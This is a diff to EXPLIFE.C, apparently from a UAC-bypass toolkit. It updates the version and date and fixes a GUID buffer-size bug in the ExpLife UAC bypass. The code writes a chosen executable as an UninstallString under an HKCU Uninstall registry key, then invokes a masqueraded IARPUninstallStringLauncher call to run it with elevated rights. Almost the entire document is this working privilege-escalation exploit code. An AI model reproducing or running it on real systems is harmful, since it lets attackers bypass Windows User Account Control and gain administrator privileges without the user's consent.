@@ -4,9 +4,9 @@
 *
 *  TITLE:       EXPLIFE.C
 *
-*  VERSION:     2.56
+*  VERSION:     2.57
 *
-*  DATE:        14 Feb 2017
+*  DATE:        07 Mar 2017
 *
 *  ExpLife UAC bypass using IARPUninstallStringLauncher.
 *  For description please visit original URL
@@ -100,22 +100,23 @@ BOOL ucmUninstallLauncherMethod(
             break;
 
         _strcpy(szKeyName, L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\");     
-        StringFromGUID2(&guid, szGuid, sizeof(szGuid));
-        _strcat(szKeyName, szGuid);
+        if (StringFromGUID2(&guid, szGuid, sizeof(szGuid) / sizeof(WCHAR))) {
+            _strcat(szKeyName, szGuid);
 
-        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, 
-            szKeyName, 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+            lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
+                szKeyName, 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
 
-        if (lResult != ERROR_SUCCESS)
-            break;
+            if (lResult != ERROR_SUCCESS)
+                break;
 
-        lResult = RegSetValueEx(hKey, L"UninstallString", 0, REG_SZ, (BYTE*)lpszExecutable,
-            (DWORD)(_strlen(lpszExecutable) * sizeof(WCHAR)));
+            lResult = RegSetValueEx(hKey, L"UninstallString", 0, REG_SZ, (BYTE*)lpszExecutable,
+                (DWORD)(_strlen(lpszExecutable) * sizeof(WCHAR)));
 
-        if (lResult != ERROR_SUCCESS)
-            break;
+            if (lResult != ERROR_SUCCESS)
+                break;
 
-        bResult = ucmMasqueradedAPRLaunchFile(szGuid);
+            bResult = ucmMasqueradedAPRLaunchFile(szGuid);
+        }
 
     } while (bCond);
 
